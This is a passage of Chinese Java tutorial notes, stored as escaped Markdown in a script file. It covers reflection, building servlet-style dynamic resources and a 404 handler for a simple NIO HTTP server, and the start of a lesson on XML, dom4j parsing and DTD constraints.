Class.forName("com.itheima.myreflect5.Student");\r\n          //2.获取里面的Method对象  function4\r\n          Method method = clazz.getMethod("function4", String.class);\r\n          //3.运行function4方法就可以了\r\n          //3.1创建一个Student对象,当做方法的调用者\r\n          Student student = (Student) clazz.newInstance();\r\n          //3.2运行方法\r\n          Object result = method.invoke(student, "zhangsan");\r\n          //4.打印一下返回值\r\n          System.out.println(result);\r\n      }\r\n  }\r\n  ```\r\n\r\n## 3.http服务器改写\r\n\r\n### 3.1静态资源和动态资源【理解】\r\n\r\n![11_请求资源分类](./img/java/basics/day25-基础加强01.img/11_请求资源分类.png)\r\n\r\n+ 静态资源\r\n\r\n  在服务器提前准备好的文件。(图片，文本)\r\n\r\n  ![09_静态资源](./img/java/basics/day25-基础加强01.img/09_静态资源.png)\r\n\r\n+ 动态资源\r\n\r\n  在图示的案例中，当用户点击了浏览器上的按钮。\r\n  本质上访问的就是服务端的某一个类中的某一个方法。\r\n  在方法中，可以写一些判断代码和逻辑代码，让响应的内容，有可能不一样了。\r\n  那么，服务端所对应的这个类我们常常将其称之为“动态资源”\r\n\r\n  ![10_动态资源](./img/java/basics/day25-基础加强01.img/10_动态资源.png)\r\n\r\n### 3.2准备工作【理解】\r\n\r\n+ 修改四个地方\r\n\r\n  + HttpResponse -> 常量WEB_APP_PATH的值与当前模块一致\r\n  + HttpServer -> main方法中端口改成80\r\n  + HttpResponse -> 添加一个write方法，添加一个带参数的构造方法\r\n  + HttpResponse -> 添加一个contentType成员变量，生成对应的set/get方法\r\n\r\n+ 示例代码\r\n\r\n  ```java\r\n  // 1.HttpResponse -> 常量WEB_APP_PATH的值与当前模块一致\r\n  public class HttpResponse {\r\n    ...\r\n    public static final String WEB_APP_PATH = "http-dynamic-server\\\\webapp";\r\n    ...\r\n  }\r\n\r\n  // 2.HttpServer -> main方法中端口改成80\r\n  public class HttpServer {\r\n    public static void main(String[] args) throws IOException {\r\n      ...\r\n      //2.让这个通道绑定一个端口\r\n    \tserverSocketChannel.bind(new InetSocketAddress(80));\r\n      ...\r\n    }\r\n  }  \r\n\r\n  // 3.HttpResponse -> 添加一个write方法，添加一个带参数的构造方法\r\n  public class HttpResponse {\r\n    ...\r\n    // 已经提供了selectionKey，所以之前的方法接收这个参数的可以去掉了，直接使用这个即可\r\n    // HttpRequest也按照此方式进行优化，定义成员变量，在构造方法中赋值，其他方法直接使用即可\r\n    private SelectionKey selectionKey;\r\n    \r\n    public HttpResponse(SelectionKey selectionKey) {\r\n          this.selectionKey = selectionKey;\r\n      }\r\n    \r\n    //给浏览器响应数据的方法 ---- 浏览器在请求动态资源时,响应数据的方法.\r\n    //content:响应的内容\r\n    public void write(String content){\r\n    }\r\n    ...\r\n  }\r\n\r\n  public class HttpServer {\r\n    public static void main(String[] args) throws IOException {\r\n      ...\r\n      //响应数据  //修改后的构造方法中要传入参数\r\n      HttpResponse httpResponse = new HttpResponse(selectionKey);\r\n      ...\r\n    }\r\n  }  \r\n\r\n  // 4.HttpResponse -> 添加一个contentType成员变量，生成对应的set/get方法\r\n  public class HttpResponse {\r\n    ...\r\n    private String contentType;//MIME类型\r\n    \r\n    public String getContentType() {\r\n          return contentType;\r\n      }\r\n    public void setContentTpye(String contentType) {\r\n          this.contentType = contentType;\r\n          //添加到map集合中\r\n          hm.put("Content-Type",contentType);\r\n      }\r\n    ...\r\n  }\r\n  ```\r\n\r\n### 3.3浏览器请求动态资源【理解】\r\n\r\n+ 两个小问题\r\n\r\n  + 服务器如何判断浏览器请求的是静态资源还是动态资源?\r\n\r\n    我们可以规定：如果浏览器地址栏中的uri是以”/servlet”开始的，那么就表示请求动态资源\r\n\r\n  + 在一个项目中有很多类，很多方法。那么请求过来之后，执行哪个方法呢?\r\n\r\n    写一个UserServlet类，在类中写service方法\r\n    我们可以规定：如果请求动态资源，就创建这个类对象，并调用service方法，表示服务器处理了当前请求\r\n\r\n+ 实现步骤\r\n\r\n  1. 解析http请求\r\n\r\n  2. 处理浏览器请求\r\n\r\n     定义一个UserServlet 类，类中定义service方法，处理浏览器请求动态资源\r\n     解析完http请求之后，再判断uri是否以/servlet开头\r\n\r\n  3. 响应\r\n\r\n+ 示例代码\r\n\r\n  ```java\r\n  public class UserServlet{\r\n    public void service(){\r\n          //模拟业务处理  ---- 就可以对这个手机号进行判断验证\r\n          System.out.println("UserServlet处理了用户的请求...");\r\n      }\r\n  }\r\n  public class HttpServer {\r\n    public static void main(String[] args) throws IOException {\r\n      \t...\r\n      \t//响应数据\r\n      \tHttpResponse httpResponse = new HttpResponse(selectionKey);\r\n          httpResponse.setHttpRequest(httpRequest);\r\n\r\n          if(httpRequest.getRequestURI().startsWith("/servlet")){\r\n            \t//本次请求动态资源\r\n            \t//处理 \r\n            \tUserServlet userServlet = new UserServlet();\r\n            \tuserServlet.service();\r\n            \t//响应\r\n          \thttpResponse.setContentTpye("text/html;charset=UTF-8");\r\n          \thttpResponse.write("ok,UserServlet处理了本次请求....");  \r\n          }else{\r\n            //本次请求静态资源\r\n            httpResponse.sendStaticResource();\r\n          }\r\n      \t...\r\n    }\r\n  } \r\n\r\n  public class HttpResponse {\r\n    \t...\r\n  \t//给浏览器响应数据的方法 ---- 浏览器在请求动态资源时,响应数据的方法.\r\n      //content:响应的内容\r\n      public void write(String content){\r\n          //准备响应行数据\r\n          this.version = "HTTP/1.1";\r\n          this.status = "200";\r\n          this.desc = "ok";\r\n\r\n          //把响应行拼接在一起\r\n          String responseLine = this.version + " " + this.status + " " + this.desc + "\\r\\n";\r\n\r\n          //准备响应头\r\n          StringBuilder sb = new StringBuilder();\r\n          Set<Map.Entry<String, String>> entries = hm.entrySet();\r\n          for (Map.Entry<String, String> entry : entries) {\r\n              //entry依次表示每一个键值对对象\r\n              //键 --- 响应头的名称\r\n              //值 --- 响应头的值\r\n              sb.append(entry.getKey()).append(": ").append(entry.getValue()).append("\\r\\n");\r\n          }\r\n\r\n          //处理响应空行\r\n          String emptyLine = "\\r\\n";\r\n\r\n          //拼接响应行,响应头,响应空行\r\n          String result = responseLine + sb.toString() + emptyLine;\r\n\r\n          try {\r\n              //给浏览器响应 响应行,响应头,响应空行\r\n              ByteBuffer byteBuffer1 = ByteBuffer.wrap(result.getBytes());\r\n              SocketChannel channel = (SocketChannel) selectionKey.channel();\r\n              channel.write(byteBuffer1);\r\n\r\n              //给浏览器响应 响应体\r\n              ByteBuffer byteBuffer2 = ByteBuffer.wrap(content.getBytes());\r\n              channel.write(byteBuffer2);\r\n\r\n              //释放资源\r\n              channel.close();\r\n\r\n          } catch (IOException e) {\r\n              System.out.println("响应数据失败....");\r\n              e.printStackTrace();\r\n          }\r\n\r\n      }    \r\n   \t ...\r\n  }\r\n  ```\r\n\r\n### 3.4main方法和Servlet优化【理解】\r\n\r\n+ main方法优化\r\n\r\n  + 需求\r\n\r\n    将请求动态资源的代码抽取到一个单独的类单独的方法中，简化main中的代码\r\n\r\n  + 代码实现\r\n\r\n    ```java\r\n    public class DynamicResourceProcess {\r\n      \r\n        //执行指定动态资源的service方法\r\n        //参数一\r\n        //由于后期可能根据用户请求的uri做出相应的处理.\r\n        //参数二\r\n        //要给用户响应数据,那么就需要使用到httpResponse.\r\n        public void process(HttpRequest httpRequest,HttpResponse httpResponse) {\r\n            // 创建UserServlet对象,调用service方法,进行处理\r\n            UserServlet userServlet = new UserServlet();\r\n            userServlet.service();\r\n\r\n            //给浏览器响应\r\n            httpResponse.setContentTpye("text/html;charset=UTF-8");\r\n            httpResponse.write("ok,UserServlet处理了本次请求....");\r\n        }\r\n    }\r\n\r\n    public class HttpServer {\r\n      public static void main(String[] args) throws IOException {\r\n        \t...\r\n        \t//响应数据\r\n        \tHttpResponse httpResponse = new HttpResponse(selectionKey);\r\n            httpResponse.setHttpRequest(httpRequest);\r\n\r\n            if(httpRequest.getRequestURI().startsWith("/servlet")){\r\n              \t//本次请求动态资源\r\n           \t\tDynamicResourceProcess drp = new DynamicResourceProcess();\r\n                drp.process(httpRequest,httpResponse);\r\n            }else{\r\n              //本次请求静态资源\r\n              httpResponse.sendStaticResource();\r\n            }\r\n        \t...\r\n      }\r\n    } \r\n    ```\r\n\r\n+ Servlet优化\r\n\r\n  + 需求\r\n\r\n    将给浏览器响应的代码写到Servlet中\r\n\r\n  + 代码实现\r\n\r\n    ```java\r\n    public class UserServlet implements HttpServlet{\r\n\r\n        //处理浏览器请求的方法\r\n        //参数一\r\n        //由于后期可能根据用户请求的uri做出相应的处理.\r\n        //参数二\r\n        //要给用户响应数据,那么就需要使用到httpResponse.\r\n        public void service(HttpRequest httpRequest, HttpResponse httpResponse){\r\n            //模拟业务处理  ---- 就可以对这个手机号进行判断验证\r\n            System.out.println("UserServlet处理了用户的请求...");\r\n            //给浏览器响应\r\n            httpResponse.setContentTpye("text/html;charset=UTF-8");\r\n            httpResponse.write("ok,UserServlet处理了本次请求....");\r\n        }\r\n    }\r\n\r\n    public class DynamicResourceProcess {\r\n      \r\n        //执行指定动态资源的service方法\r\n        //参数一\r\n        //由于后期可能根据用户请求的uri做出相应的处理.\r\n        //参数二\r\n        //要给用户响应数据,那么就需要使用到httpResponse.\r\n        public void process(HttpRequest httpRequest,HttpResponse httpResponse) {\r\n            // 创建UserServlet对象,调用service方法,进行处理\r\n            UserServlet userServlet = new UserServlet();\r\n            userServlet.service(httpRequest,httpResponse);\r\n        }\r\n    }\r\n    ```\r\n\r\n### 3.5多个动态资源【理解】\r\n\r\n+ 多个动态资源\r\n\r\n  针对每一个业务操作，我们都会去定义一个对应的Servlet来完成。\r\n  就会在服务端产生很多个Servlet\r\n\r\n  ![12_多个动态资源](./img/java/basics/day25-基础加强01.img/12_多个动态资源.png)\r\n\r\n+ 实现步骤\r\n\r\n  + 定义一个接口HttpServlet，接口中定义service方法。\r\n  + 针对于每一种业务，都定义一个servlet类与之对应，该类实现HttpServlet接口\r\n  + 获取请求的uri，进行判断，调用不同的servlet类中的service方法\r\n\r\n+ 代码实现\r\n\r\n  ```java\r\n  // 1.定义一个接口HttpServlet，接口中定义service方法\r\n  public interface HttpServlet {\r\n\r\n      //定义业务处理的方法\r\n      public abstract void service(HttpRequest httpRequest, HttpResponse httpResponse);\r\n  }\r\n\r\n  // 2.针对于每一种业务，都定义一个servlet类与之对应，该类实现HttpServlet接口\r\n  public class UserServlet implements HttpServlet{\r\n      //处理浏览器请求的方法\r\n      //参数一\r\n      //由于后期可能根据用户请求的uri做出相应的处理.\r\n      //参数二\r\n      //要给用户响应数据,那么就需要使用到httpResponse.\r\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse){\r\n          //模拟业务处理  ---- 就可以对这个手机号进行判断验证\r\n          System.out.println("UserServlet处理了用户的请求...");\r\n          //给浏览器响应\r\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\r\n          httpResponse.write("ok,UserServlet处理了本次请求....");\r\n      }\r\n  }\r\n\r\n  public class LoginServlet implements HttpServlet{\r\n      @Override\r\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\r\n         //处理\r\n          System.out.println("LoginServlet处理了登录请求");\r\n         //响应\r\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\r\n          httpResponse.write("登录成功");\r\n      }\r\n  }\r\n\r\n  public class RegisterServlet implements HttpServlet{\r\n      @Override\r\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\r\n         //处理\r\n          System.out.println("RegisterServlet处理了注册请求");\r\n         //响应\r\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\r\n          httpResponse.write("注册成功");\r\n      }\r\n  }\r\n\r\n  public class SearchServlet implements HttpServlet{\r\n      @Override\r\n      public void service(HttpRequest httpRequest, HttpResponse httpResponse) {\r\n         //处理\r\n          System.out.println("SearchServlet处理了搜索商品请求");\r\n         //响应\r\n          httpResponse.setContentTpye("text/html;charset=UTF-8");\r\n          httpResponse.write("响应了一些商品信息");\r\n      }\r\n  }\r\n\r\n  // 3.获取请求的uri，进行判断，调用不同的servlet类中的service方法\r\n  public class DynamicResourceProcess {\r\n    \r\n      public void process(HttpRequest httpRequest,HttpResponse httpResponse){\r\n            //获取请求的uri\r\n            String requestURI = httpRequest.getRequestURI();\r\n   \r\n            //根据请求的uri进行判断\r\n            if("/servlet/loginservlet".equals(requestURI)){\r\n                //登录请求\r\n                LoginServlet loginServlet = new LoginServlet();\r\n                loginServlet.service(httpRequest,httpResponse);\r\n            }else if("/servlet/registerservlet".equals(requestURI)){\r\n                //注册请求\r\n                RegisterServlet registerServlet = new RegisterServlet();\r\n                registerServlet.service(httpRequest,httpResponse);\r\n            }else if("/servlet/searchservlet".equals(requestURI)){\r\n                //搜索商品请求\r\n                SearchServlet searchServlet = new SearchServlet();\r\n                searchServlet.service(httpRequest,httpResponse);\r\n            }else{\r\n                //表示默认处理方法\r\n                //创建UserServlet对象,调用service方法,进行处理\r\n                UserServlet userServlet = new UserServlet();\r\n                userServlet.service(httpRequest,httpResponse);\r\n            }\r\n        }\r\n  }\r\n  ```\r\n\r\n### 3.6通过反射和配置文件优化【理解】\r\n\r\n+ 优化步骤\r\n\r\n  1. 把Servlet信息写到properties配置文件中\r\n\r\n     格式为：servlet-info=/servlet/UserServlet，全类名；/servlet/loginServlet，全类名\r\n\r\n  2. 定义一个接口ServletConcurrentHashMap，接口中定义ConcurrentHashMap，该集合存储所有的servlet信息\r\n\r\n  3. 定义一个接口ParseServletConfig，该接口中定义一个方法（parse）\r\n\r\n  4. 定义ParseServletConfig的实现类，解析配置文件，并把配置文件中Servlet信息存到map集合中\r\n\r\n  5. 在main方法的第一行，开启一条线程执行解析配置文件的代码\r\n\r\n  6. 修改处理DynamicResourceProcess中的process方法\r\n\r\n     ![13_反射和配置文件优化](./img/java/basics/day25-基础加强01.img/13_反射和配置文件优化.png)\r\n\r\n+ 代码实现\r\n\r\n  ```java\r\n  // 1.把Servlet信息写到properties配置文件中\r\n  // 在webapp\\config\\servlet-info.properties文件中，写入如下内容\r\n  servlet-info=/servlet/loginservlet,com.itheima.myservlet.LoginServlet;/servlet/registerservlet,com.itheima.myservlet.RegisterServlet;/servlet/searchservlet,com.itheima.myservlet.SearchServlet;/servlet/lostpasswordservlet,com.itheima.myservlet.LostPasswordServlet\r\n\r\n  // 2.定义一个接口ServletConcurrentHashMap，接口中定义ConcurrentHashMap，该集合存储所有的servlet信息\r\n  public interface ServletConcurrentHashMap {\r\n      //存储请求路径和对应的servlet的map集合\r\n      //键: 请求的uri\r\n      //值: 对应的Servlet对象\r\n      public static final ConcurrentHashMap<String,  HttpServlet> map = new ConcurrentHashMap<>();\r\n  }\r\n\r\n  // 3.定义一个接口ParseServletConfig，该接口中定义一个方法（parse）\r\n  public interface ParseServletConfig {\r\n      //解析数据的方法\r\n      public abstract void parse();\r\n  }\r\n\r\n  // 4.定义ParseServletConfig的实现类，解析配置文件，并把配置文件中Servlet信息存到map集合中\r\n  public class PropertiesParseServletConfig implements ParseServletConfig {\r\n      @Override\r\n      public void parse() {\r\n\r\n          try {\r\n              //1.读取配置文件中的数据\r\n              Properties properties = new Properties();\r\n              FileReader fr = new FileReader("http-dynamic-server/webapp/config/servlet-info.properties");\r\n              properties.load(fr);\r\n              fr.close();\r\n\r\n              //2.获取集合中servlet-info的属性值\r\n              String properValue = (String) properties.get("servlet-info");\r\n              // uri,全类名;uri,全类名\r\n\r\n              //3.解析\r\n              String[] split = properValue.split(";");\r\n              for (String servletInfo : split) {\r\n                  String[] servletInfoArr = servletInfo.split(",");\r\n                  String uri = servletInfoArr[0];\r\n                  String servletName = servletInfoArr[1];\r\n\r\n                  //我们需要通过servletName(全类名)来创建他的对象\r\n                  Class clazz = Class.forName(servletName);\r\n                  HttpServlet httpServlet = (HttpServlet) clazz.newInstance();\r\n                  //4.将uri和httpServlet添加到map集合中\r\n                  ServletConcurrentHashMap.map.put(uri,httpServlet);\r\n              }\r\n          } catch (Exception e) {\r\n              System.out.println("解析数据异常.....");\r\n              e.printStackTrace();\r\n          }\r\n      }\r\n  }\r\n\r\n  public class LoaderResourceRunnable implements  Runnable {\r\n      @Override\r\n      public void run() {\r\n          //执行parse方法\r\n          ParseServletConfig parseServletConfig = new PropertiesParseServletConfig();\r\n          parseServletConfig.parse();\r\n          \r\n      }\r\n  }\r\n\r\n  // 5.在main方法的第一行，开启一条线程执行解析配置文件的代码\r\n  public class HttpServer {\r\n      public static void main(String[] args) throws IOException {\r\n          //开启一条线程去解析配置文件\r\n          new Thread(new LoaderResourceRunnable()).start();\r\n          ...\r\n      }\r\n  }\r\n\r\n  // 6.修改处理DynamicResourceProcess中的process方法\r\n  public class DynamicResourceProcess {\r\n    \r\n      public void process(HttpRequest httpRequest,HttpResponse httpResponse){\r\n            \t//获取请求的uri\r\n            \tString requestURI = httpRequest.getRequestURI();\r\n            \t//根据请求的uri到map集合中直接找到对应的servlet的对象\r\n          \tHttpServlet httpServlet = ServletConcurrentHashMap.map.get(requestURI);\r\n              //调用service方法对请求进行处理并响应\r\n              httpServlet.service(httpRequest,httpResponse);\r\n      }\r\n  }    \r\n  ```\r\n\r\n### 3.7Servlet忘记实现HttpServlet接口处理【理解】\r\n\r\n+ 出现情况\r\n\r\n  在写Servlet时，忘记了实现HttpServlet接口\r\n\r\n+ 导致结果\r\n\r\n  在反射创建对象后，强转成HttpServlet时，会报类型转换异常\r\n\r\n+ 解决方案\r\n\r\n  在反射创建对象后，强转成HttpServlet前，进行判断\r\n\r\n  如果有实现HttpServlet接口，就进行强转\r\n\r\n  否则抛出一个异常\r\n\r\n+ 代码实现\r\n\r\n  ```java\r\n  public class PropertiesParseServletConfig implements ParseServletConfig {\r\n      @Override\r\n      public void parse() {\r\n\r\n          try {\r\n              //1.读取配置文件中的数据\r\n              Properties properties = new Properties();\r\n              FileReader fr = new FileReader("http-dynamic-server/webapp/config/servlet-info.properties");\r\n              properties.load(fr);\r\n              fr.close();\r\n\r\n              //2.获取集合中servlet-info的属性值\r\n              String properValue = (String) properties.get("servlet-info");\r\n              // uri,全类名;uri,全类名\r\n\r\n              //3.解析\r\n              String[] split = properValue.split(";");\r\n              for (String servletInfo : split) {\r\n                  String[] servletInfoArr = servletInfo.split(",");\r\n                  String uri = servletInfoArr[0];\r\n                  String servletName = servletInfoArr[1];\r\n\r\n                  //我们需要通过servletName(全类名)来创建他的对象\r\n                  Class clazz = Class.forName(servletName);\r\n\r\n                  //获取该类所实现的所有的接口信息,得到的是一个数组\r\n                  Class[] interfaces = clazz.getInterfaces();\r\n\r\n                  //定义一个boolean类型的变量\r\n                  boolean flag =  false;\r\n                  //遍历数组\r\n                  for (Class clazzInfo : interfaces) {\r\n                      //判断当前所遍历的接口的字节码对象是否和HttpServlet的字节码文件对象相同\r\n                      if(clazzInfo == HttpServlet.class){\r\n\r\n                          //如果相同,就需要更改flag值.结束循环\r\n                          flag = true;\r\n                          break;\r\n                      }\r\n                  }\r\n\r\n                  if(flag){\r\n                      //true就表示当前的类已经实现了HttpServlet接口\r\n                      HttpServlet httpServlet = (HttpServlet) clazz.newInstance();\r\n                      //4.将uri和httpServlet添加到map集合中\r\n                      ServletConcurrentHashMap.map.put(uri,httpServlet);\r\n                  }else{\r\n                      //false就表示当前的类还没有实现HttpServlet接口\r\n                      throw new NotImplementsHttpServletException(clazz.getName() + "Not Implements HttpServlet");\r\n                  }\r\n              }\r\n          } catch (NotImplementsHttpServletException e) {\r\n              e.printStackTrace();\r\n          }catch (Exception e) {\r\n              System.out.println("解析数据异常.....");\r\n              e.printStackTrace();\r\n          }\r\n      }\r\n  }\r\n\r\n  ```\r\n\r\n### 3.8响应404【理解】\r\n\r\n+ 出现情况\r\n\r\n  客户端浏览器请求了一个服务器中不存在的动态资源\r\n\r\n+ 导致结果\r\n\r\n  服务器中代码出现异常，程序停止\r\n\r\n+ 解决方案\r\n\r\n  如果请求的动态资源不存在，服务器根据请求的uri找到对应的Servlet时为null，继续调用方法会出现异常\r\n\r\n  增加一个非空的判断，如果不为null，则继续处理请求，调用方法\r\n\r\n  如果为null，则响应404\r\n\r\n+ 代码实现\r\n\r\n  ```java\r\n  public class DynamicResourceProcess {\r\n      //执行指定动态资源的service方法\r\n      //参数一\r\n      //由于后期可能根据用户请求的uri做出相应的处理.\r\n      //参数二\r\n      //要给用户响应数据,那么就需要使用到httpResponse.\r\n      public void process(HttpRequest httpRequest,HttpResponse httpResponse){\r\n          //获取请求的uri\r\n          String requestURI = httpRequest.getRequestURI();\r\n          //根据请求的uri到map集合中直接找到对应的servlet的对象\r\n          HttpServlet httpServlet = ServletConcurrentHashMap.map.get(requestURI);\r\n          if(httpServlet != null){\r\n              //调用service方法对请求进行处理并响应\r\n              httpServlet.service(httpRequest,httpResponse);\r\n          }else{\r\n              //浏览器请求的动态资源不存在\r\n              //响应404\r\n              response404(httpResponse);\r\n          }\r\n      }\r\n      //浏览器请求动态资源不存在,响应404的方法\r\n      private void response404(HttpResponse httpResponse) {\r\n          try {\r\n              //准备响应行\r\n              String responseLine = "HTTP/1.1 404 NOT FOUND\\r\\n";\r\n              //准备响应头\r\n              String responseHeader = "Content-Type: text/html;charset=UTF-8\\r\\n";\r\n              //准备响应空行\r\n              String emptyLine = "\\r\\n";\r\n              //拼接在一起\r\n              String result = responseLine + responseHeader + emptyLine;\r\n\r\n              //把响应行,响应头,响应空行去响应给浏览器\r\n              SelectionKey selectionKey = httpResponse.getSelectionKey();\r\n              SocketChannel channel = (SocketChannel) selectionKey.channel();\r\n\r\n              ByteBuffer byteBuffer1 = ByteBuffer.wrap(result.getBytes());\r\n              channel.write(byteBuffer1);\r\n\r\n              //给浏览器 响应 响应体内容\r\n              ByteBuffer byteBuffer2 = ByteBuffer.wrap("404 NOT FOUND....".getBytes());\r\n              channel.write(byteBuffer2);\r\n\r\n              //释放资源\r\n              channel.close();\r\n          } catch (IOException e) {\r\n              e.printStackTrace();\r\n          }\r\n      }\r\n  }\r\n  ```\r\n\r\n  ​\r\n\r\n',nr='## 1.xml\n\n### 1.1概述【理解】\n\n+ 万维网联盟(W3C)\n\n  万维网联盟(W3C)创建于1994年，又称W3C理事会。1994年10月在麻省理工学院计算机科学实验室成立。\n  建立者： Tim Berners-Lee (蒂姆·伯纳斯·李)。\n  是Web技术领域最具权威和影响力的国际中立性技术标准机构。\n  到目前为止，W3C已发布了200多项影响深远的Web技术标准及实施指南，\n\n  + 如广为业界采用的超文本标记语言HTML（标准通用标记语言下的一个应用）、\n\n  + 可扩展标记语言XML（标准通用标记语言下的一个子集）\n\n  + 以及帮助残障人士有效获得Web信息的无障碍指南（WCAG）等\n\n    ![01_w3c概述](./img/java/basics/day26-基础加强02.img/01_w3c概述.png)\n\n+ xml概述\n\n  XML的全称为(EXtensible Markup Language)，是一种可扩展的标记语言\n  标记语言: 通过标签来描述数据的一门语言(标签有时我们也将其称之为元素)\n  可扩展：标签的名字是可以自定义的,XML文件是由很多标签组成的,而标签名是可以自定义的\n\n+ 作用\n\n  + 用于进行存储数据和传输数据\n  + 作为软件的配置文件\n\n+ 作为配置文件的优势\n\n  + 可读性好\n  + 可维护性高\n\n### 1.2标签的规则【应用】\n\n+ 标签由一对尖括号和合法标识符组成\n\n  ```java\n  <student>\n  ```\n\n+ 标签必须成对出现\n\n  ```java\n  <student> </student>\n  前边的是开始标签，后边的是结束标签\n  ```\n\n+ 特殊的标签可以不成对,但是必须有结束标记\n\n  ```java\n  <address/>\n  ```\n\n+ 标签中可以定义属性,属性和标签名空格隔开,属性值必须用引号引起来\n\n  ```java\n  <student id="1"> </student>\n  ```\n\n+ 标签需要正确的嵌套\n\n  ```java\n  这是正确的: <student id="1"> <name>张三</name> </student>\n  这是错误的: <student id="1"><name>张三</student></name>\n  ```\n\n### 1.3语法规则【应用】\n\n+ 语法规则\n\n  + XML文件的后缀名为：xml\n\n  + 文档声明必须是第一行第一列\n\n    <?xml version=“1.0” encoding=“UTF-8” standalone=“yes”?>\n    version：该属性是必须存在的\n    encoding：该属性不是必须的\n\n    ​\t打开当前xml文件的时候应该是使用什么字符编码表(一般取值都是UTF-8)\n\n    standalone: 该属性不是必须的，描述XML文件是否依赖其他的xml文件，取值为yes/no\n\n  + 必须存在一个根标签，有且只能有一个\n\n  + XML文件中可以定义注释信息\n\n  + XML文件中可以存在以下特殊字符\n\n    ```java\n    &lt; < 小于\n    &gt; > 大于\n    &amp; & 和号\n    &apos; \' 单引号\n    &quot; " 引号\n    ```\n\n  + XML文件中可以存在CDATA区\n\n    <![CDATA[ …内容… ]]>\n\n+ 示例代码\n\n  ```xml\n  <?xml version="1.0" encoding="UTF-8" ?>\n  \x3c!--注释的内容--\x3e\n  \x3c!--本xml文件用来描述多个学生信息--\x3e\n  <students>\n\n      \x3c!--第一个学生信息--\x3e\n      <student id="1">\n          <name>张三</name>\n          <age>23</age>\n          <info>学生&lt; &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;的信息</info>\n          <message> <![CDATA[内容 <<<<<< >>>>>> ]]]></message>\n      </student>\n\n      \x3c!--第二个学生信息--\x3e\n      <student id="2">\n          <name>李四</name>\n          <age>24</age>\n      </student>\n\n  </students>\n  ```\n\n### 1.4xml解析【应用】\n\n+ 概述\n\n  xml解析就是从xml中获取到数据\n\n+ 常见的解析思想\n\n  DOM(Document Object Model)文档对象模型:就是把文档的各个组成部分看做成对应的对象。\n  会把xml文件全部加载到内存,在内存中形成一个树形结构,再获取对应的值\n\n  ![02_dom解析概述](./img/java/basics/day26-基础加强02.img/02_dom解析概述.png)\n\n+ 常见的解析工具\n\n  + JAXP: SUN公司提供的一套XML的解析的API\n  + JDOM: 开源组织提供了一套XML的解析的API-jdom\n  + DOM4J: 开源组织提供了一套XML的解析的API-dom4j,全称：Dom For Java\n  + pull: 主要应用在Android手机端解析XML\n\n+ 解析的准备工作\n\n  1. 我们可以通过网站：https://dom4j.github.io/ 去下载dom4j\n\n     今天的资料中已经提供,我们不用再单独下载了,直接使用即可\n\n  2. 将提供好的dom4j-1.6.1.zip解压,找到里面的dom4j-1.6.1.jar\n\n  3. 在idea中当前模块下新建一个libs文件夹,将jar包复制到文件夹中\n\n  4. 选中jar包 -> 右键 -> 选择add as library即可\n\n+ 需求\n\n  + 解析提供好的xml文件\n  + 将解析到的数据封装到学生对象中\n  + 并将学生对象存储到ArrayList集合中\n  + 遍历集合\n\n+ 代码实现\n\n  ```java\n  <?xml version="1.0" encoding="UTF-8" ?>\n  \x3c!--注释的内容--\x3e\n  \x3c!--本xml文件用来描述多个学生信息--\x3e\n  <students>\n\n      \x3c!--第一个学生信息--\x3e\n      <student id="1">\n          <name>张三</name>\n          <age>23</age>\n      </student>\n\n      \x3c!--第二个学生信息--\x3e\n      <student id="2">\n          <name>李四</name>\n          <age>24</age>\n      </student>\n\n  </students>\n\n  // 上边是已经准备好的student.xml文件\n  public class Student {\n      private String id;\n      private String name;\n      private int age;\n\n      public Student() {\n      }\n\n      public Student(String id, String name, int age) {\n          this.id = id;\n          this.name = name;\n          this.age = age;\n      }\n\n      public String getId() {\n          return id;\n      }\n\n      public void setId(String id) {\n          this.id = id;\n      }\n\n      public String getName() {\n          return name;\n      }\n\n      public void setName(String name) {\n          this.name = name;\n      }\n\n      public int getAge() {\n          return age;\n      }\n\n      public void setAge(int age) {\n          this.age = age;\n      }\n\n      @Override\n      public String toString() {\n          return "Student{" +\n                  "id=\'" + id + \'\\\'\' +\n                  ", name=\'" + name + \'\\\'\' +\n                  ", age=" + age +\n                  \'}\';\n      }\n  }\n\n  /**\n   * 利用dom4j解析xml文件\n   */\n  public class XmlParse {\n      public static void main(String[] args) throws DocumentException {\n          //1.获取一个解析器对象\n          SAXReader saxReader = new SAXReader();\n          //2.利用解析器把xml文件加载到内存中,并返回一个文档对象\n          Document document = saxReader.read(new File("myxml\\\\xml\\\\student.xml"));\n          //3.获取到根标签\n          Element rootElement = document.getRootElement();\n          //4.通过根标签来获取student标签\n          //elements():可以获取调用者所有的子标签.会把这些子标签放到一个集合中返回.\n          //elements("标签名"):可以获取调用者所有的指定的子标签,会把这些子标签放到一个集合中并返回\n          //List list = rootElement.elements();\n          List<Element> studentElements = rootElement.elements("student");\n          //System.out.println(list.size());\n\n          //用来装学生对象\n          ArrayList<Student> list = new ArrayList<>();\n\n          //5.遍历集合,得到每一个student标签\n          for (Element element : studentElements) {\n              //element依次表示每一个student标签\n    \n              //获取id这个属性\n              Attribute attribute = element.attribute("id");\n              //获取id的属性值\n              String id = attribute.getValue();\n\n              //获取name标签\n              //element("标签名"):获取调用者指定的子标签\n              Element nameElement = element.element("name");\n              //获取这个标签的标签体内容\n              String name = nameElement.getText();\n\n              //获取age标签\n              Element ageElement = element.element("age");\n              //获取age标签的标签体内容\n              String age = ageElement.getText();\n\n  //            System.out.println(id);\n  //            System.out.println(name);\n  //            System.out.println(age);\n\n              Student s = new Student(id,name,Integer.parseInt(age));\n              list.add(s);\n          }\n          //遍历操作\n          for (Student student : list) {\n              System.out.println(student);\n          }\n      }\n  }\n  ```\n\n### 1.5DTD约束【理解】\n\n+ 什么是约束\n\n  用来限定xml文件中可使用的标签以及属性\n\n+ 约束的分类\n\n  + DTD\n  + schema\n\n+ 编写DTD约束\n\n  + 步骤\n\n    1. 创建一个文件，这个文件的后缀名为.dtd\n\n    2. 看xml文件中使用了哪些元素\n\n       <!ELEMENT> 可以定义元素\n\n    3. 判断元素是简单元素还是复杂元素\n\n       简单元素：没有子元素。\n       复杂元素：有子元素的元素；\n\n  + 代码实现\n\n    ```java\n    <!ELEMENT persons (person)>\n    <!ELEMENT person (name,age)>\n    <!ELEMENT name (#PCDATA)>\n    <!ELEMENT age (#PCDATA)>\n    ```\n  ```\n\n  ```\n\n+ 引入DTD约束\n\n  + 